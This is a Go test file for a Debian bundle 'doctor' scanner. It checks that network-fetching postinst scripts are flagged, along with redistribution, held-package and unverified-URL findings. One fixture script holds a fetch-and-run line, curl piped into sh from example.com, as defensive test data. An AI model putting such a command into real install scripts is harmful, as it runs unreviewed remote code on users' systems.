package doctor

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/inferops/debark/core/lock"
)

// buildBundleDir lays out BundleDir/repo/<pkg.Filename> for every package so
// Run can find the .deb files it needs to scan, mirroring the real bundle
// layout: repo/pool/<p>/<pkg>/<pkg>_<ver>_<arch>.deb.
func buildBundleDir(t *testing.T, pkgs map[string]fixtureDeb) (string, []lock.Package) {
	t.Helper()
	root := t.TempDir()
	var out []lock.Package
	for name, f := range pkgs {
		rel := filepath.Join("pool", string(name[0]), name, name+"_1.0_amd64.deb")
		full := filepath.Join(root, "repo", rel)
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		data := buildFixtureDeb(t, f)
		if err := os.WriteFile(full, data, 0o644); err != nil {
			t.Fatal(err)
		}
		out = append(out, lock.Package{
			Name:                  name,
			Arch:                  "amd64",
			Version:               "1.0",
			Filename:              filepath.ToSlash(rel),
			Size:                  int64(len(data)),
			PublisherVerification: lock.VerifiedAPTSigned,
			Reason:                lock.ReasonRequested,
		})
	}
	return root, out
}

func TestRun_NilLockIsANoOp(t *testing.T) {
	report, err := Run(context.Background(), Input{})
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if report == nil {
		t.Fatal("Run should return a non-nil Report even with no Lock")
	}
	if len(report.Findings) != 0 || report.Scanned != 0 {
		t.Errorf("expected an empty report, got %+v", report)
	}
}

func TestRun_EndToEnd(t *testing.T) {
	bundleDir, pkgs := buildBundleDir(t, map[string]fixtureDeb{
		"clean-pkg": {
			Scripts: map[string]string{"postinst": "#!/bin/sh\ntrue\n"},
		},
		"curly-pkg": {
			Scripts: map[string]string{"postinst": "#!/bin/sh\ncurl -fsSL https://example.com/x.sh | sh\n"},
		},
	})

	l := &lock.Lock{Packages: pkgs}
	// lock.Package doesn't sort itself in this test helper; Run must not
	// depend on caller order for its own internal correctness (it sorts
	// findings itself), but give it an unsorted-looking input anyway to stay
	// honest about not assuming order.

	report, err := Run(context.Background(), Input{
		BundleDir:   bundleDir,
		Lock:        l,
		ScanScripts: true,
	})
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if report.Scanned != 2 {
		t.Errorf("Scanned = %d, want 2", report.Scanned)
	}

	var networkFindings []Finding
	for _, f := range report.Findings {
		if f.Check == CheckNetworkPostinst {
			networkFindings = append(networkFindings, f)
		}
	}
	if len(networkFindings) != 1 {
		t.Fatalf("want exactly 1 network-postinst finding (from curly-pkg only), got %d: %+v", len(networkFindings), report.Findings)
	}
	if networkFindings[0].Package != "curly-pkg" {
		t.Errorf("finding is for %q, want curly-pkg", networkFindings[0].Package)
	}
	if networkFindings[0].Flag != lock.FlagNetworkPostinst {
		t.Errorf("Flag = %q", networkFindings[0].Flag)
	}

	if report.Summary["warn"] != len(report.Findings) {
		t.Errorf("Summary[warn] = %d, want %d (all findings are warn severity)", report.Summary["warn"], len(report.Findings))
	}

	gotFlags := FlagsFor(report.Findings, "curly-pkg")
	if len(gotFlags) != 1 || gotFlags[0] != lock.FlagNetworkPostinst {
		t.Errorf("FlagsFor(curly-pkg) = %v", gotFlags)
	}
	if got := FlagsFor(report.Findings, "clean-pkg"); got != nil {
		t.Errorf("FlagsFor(clean-pkg) = %v, want nil", got)
	}
}

func TestRun_ScanScriptsFalseSkipsScriptChecks(t *testing.T) {
	bundleDir, pkgs := buildBundleDir(t, map[string]fixtureDeb{
		"curly-pkg": {
			Scripts: map[string]string{"postinst": "#!/bin/sh\ncurl -fsSL https://example.com/x.sh | sh\n"},
		},
	})
	report, err := Run(context.Background(), Input{
		BundleDir:   bundleDir,
		Lock:        &lock.Lock{Packages: pkgs},
		ScanScripts: false,
	})
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	for _, f := range report.Findings {
		if f.Check == CheckNetworkPostinst {
			t.Errorf("ScanScripts=false should skip network-postinst, got %+v", f)
		}
	}
}

func TestRun_NonScriptChecksAndDeterministicOrder(t *testing.T) {
	l := &lock.Lock{
		Packages: []lock.Package{
			{Name: "zeta-multiverse", Arch: "amd64", Version: "1.0", Origin: lock.Origin{Component: "multiverse"}},
			{Name: "alpha-multiverse", Arch: "amd64", Version: "1.0", Origin: lock.Origin{Component: "multiverse"}},
			{Name: "unverified-tool", Arch: "amd64", Version: "1.0", PublisherVerification: lock.VerifiedURLUnverified, Origin: lock.Origin{URI: "https://vendor.example/tool.deb"}},
		},
	}
	dpkgStatus := []byte("Package: zeta-multiverse\nStatus: hold ok installed\nVersion: 1.0\n")

	in := Input{Lock: l, DpkgStatus: dpkgStatus}

	var first *Report
	for i := 0; i < 3; i++ {
		report, err := Run(context.Background(), in)
		if err != nil {
			t.Fatalf("run %d: Run: %v", i, err)
		}
		if i == 0 {
			first = report
			continue
		}
		if len(report.Findings) != len(first.Findings) {
			t.Fatalf("run %d: %d findings, want %d", i, len(report.Findings), len(first.Findings))
		}
		for j := range first.Findings {
			if report.Findings[j] != first.Findings[j] {
				t.Fatalf("run %d: finding %d differs:\n got: %+v\nwant: %+v", i, j, report.Findings[j], first.Findings[j])
			}
		}
	}

	var haveRedistribution, haveHeld, haveUnverified int
	for _, f := range first.Findings {
		switch f.Check {
		case CheckRedistribution:
			haveRedistribution++
		case CheckHeldPackage:
			haveHeld++
		case CheckUnverifiedURL:
			haveUnverified++
		}
	}
	if haveRedistribution != 2 {
		t.Errorf("want 2 redistribution findings (both multiverse packages), got %d", haveRedistribution)
	}
	if haveHeld != 1 {
		t.Errorf("want 1 held-package finding, got %d", haveHeld)
	}
	if haveUnverified != 1 {
		t.Errorf("want 1 unverified-url finding, got %d", haveUnverified)
	}
}

func TestRun_ContextCancelled(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	_, err := Run(ctx, Input{Lock: &lock.Lock{Packages: []lock.Package{{Name: "x"}}}})
	if err == nil {
		t.Fatal("expected an error for an already-cancelled context")
	}
}
